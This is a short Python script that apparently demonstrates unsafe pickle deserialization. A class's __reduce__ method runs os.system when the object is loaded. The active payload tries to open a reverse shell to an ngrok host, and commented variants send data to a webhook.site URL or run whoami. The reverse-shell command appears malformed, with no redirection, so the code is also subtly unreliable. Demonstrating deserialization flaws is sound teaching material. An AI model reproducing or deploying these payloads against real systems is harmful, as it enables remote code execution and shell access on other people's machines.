
#example of unsafe de-serialization
import pickle
import os


## go to webhook.site and copy-paste the unique URL into <URL>
##class MyEvilPickle(object):
##	def __reduce__(self):
##		return (os.system, ("curl <URL> --data \"Hello\"", ))


## uncomment these if you wanna try and deserialize other bad things

##class MyEvilPickle(object):
##	def __reduce__(self):
##		return (os.system, ("whoami", ))

class MyEvilPickle(object):
	def __reduce__(self):
		return (os.system, ("bash -c 'bash -i /dev/tcp/4.tcp.ngrok.io/11687'", ))




EvilExample = MyEvilPickle()


pickle.dump(EvilExample, open("save.p", "wb"))
## serialize the object

my_data = pickle.load(open("save.p", "rb"))
## deserialize the object

